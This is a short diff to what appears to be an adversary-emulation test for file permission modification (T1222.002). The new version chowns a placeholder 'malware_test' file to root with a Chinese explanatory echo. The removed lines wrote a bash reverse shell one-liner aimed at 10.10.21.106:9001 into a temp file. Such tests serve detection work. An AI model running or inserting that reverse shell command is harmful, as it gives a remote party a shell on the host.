@@ -1,9 +1,8 @@
 Elevation Required;
 #command
-touch /tmp/T1222.002
-echo "sh -i >& /dev/tcp/10.10.21.106/9001 0>&1" > /tmp/T1222.002
-chown root:root /tmp/T1222.002
+echo "使用chown将木马程序/tmp/malware_test的权限改为root："
+chown root:root /tmp/malware_test
 #check
-ls -l /tmp/T1222.002
+ls -l /tmp/malware_test
 #cleanup
-rm -f /tmp/T1222.002
+rm -f /tmp/malware_test
